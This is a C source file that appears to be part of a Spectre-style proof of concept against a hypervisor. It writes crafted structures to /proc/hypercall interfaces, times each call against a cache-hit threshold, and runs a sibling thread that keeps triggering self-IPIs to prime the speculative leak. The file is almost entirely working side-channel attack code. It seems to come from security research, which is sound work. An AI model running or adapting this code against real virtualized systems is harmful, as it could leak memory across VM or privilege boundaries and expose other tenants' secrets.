#define _GNU_SOURCE
#include <err.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <assert.h>
#include <pthread.h>
#include "constants.h"
#include "spectre.h"
#include "timing.h"

pthread_t sibling = -1;
int sibling_stop = 0;

static int half_spectre_raw(void *buf, const size_t idx, const size_t iters) {
	static int fd_sched_yield = -1;
	if (fd_sched_yield == -1) {
		fd_sched_yield = open ("/proc/hypercall/sched_yield", O_WRONLY);
		assert(fd_sched_yield > 0);
	}

	static struct sched_yield_hypercall opts = {
		.current_cpu_id = -1,
		.speculated_cpu_id = -1,
		.ptr = NULL
	};
	if (opts.current_cpu_id == -1ULL) {
		unsigned int cpu = 0;
		if (getcpu(&cpu, NULL) == -1) {
			err(EXIT_FAILURE, "Failed to get CPU");
		}
		opts.current_cpu_id = cpu;
	}

	opts.speculated_cpu_id = idx;
	opts.ptr = buf;

	int hits = 0;
	for (size_t i = 0; i < iters; ++i) {
		ssize_t time = write(fd_sched_yield, &opts, sizeof(opts));
		assert(time >= 0);
		if (time < CACHE_HIT_THRESHOLD) {
			hits++;
		}
	}

	return hits;
}

void half_spectre(unsigned char *p, uintptr_t pa_p, uintptr_t pa_base)
{
	for (int delta_p = 0; delta_p <= 0x200; delta_p += 0x200) {
		for (int delta_off = 0; delta_off <= 0x200; delta_off += 0x200) {
			uint64_t off = pa_p - pa_base + delta_off;
			printf("half_spectre | pa_base = %lx | p's pa = %lx | offset = %lx | idx = %lx ", pa_base, pa_p+delta_p, off, off/8);
			printf("| hits = %d / 10M\n", half_spectre_raw(p + delta_p, off/8, 10000000));
		}
	}
}


static void do_spectre_touch_base(int repeat) {
	static struct self_send_ipi_hypercall opts = {.min = 0, .repeat = 1};
	static int fd = -1;
	if (fd == -1) {
		fd = open("/proc/hypercall/self_send_ipi", O_WRONLY);
		assert(fd > 0);
	}

	opts.repeat = repeat;
	assert(write(fd, &opts, sizeof(opts)) != 1);
}

static void *spectre_touch_base(void *data)
{
	const int verbose = 1;
	if (verbose) printf("[sibling] starting spectre_touch_base\n");
	static int triggers = 0;
	uint64_t start = clock_read();
	while (!sibling_stop) {
		do_spectre_touch_base(1000);
		triggers += 1000;
		if (verbose) if (triggers % 100000 == 0) {
			double duration = (clock_read() - start) / 1000000000.0;
			printf("[sibling] spectre_touch_base: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
			fflush(stdout);
			printf("\33[2K\r");
		}
	}
	if (verbose) printf("[sibling] exiting spectre_touch_base\n");
	return NULL;
}

void spectre_touch_base_start(void)
{
	if (sibling == -1LU) {
		sibling_stop = 0;
		assert(pthread_create(&sibling, NULL, spectre_touch_base, NULL) == 0);
	}
}

void spectre_touch_base_stop(void)
{
	sibling_stop = 1;
	assert(pthread_join(sibling, NULL) == 0);
}
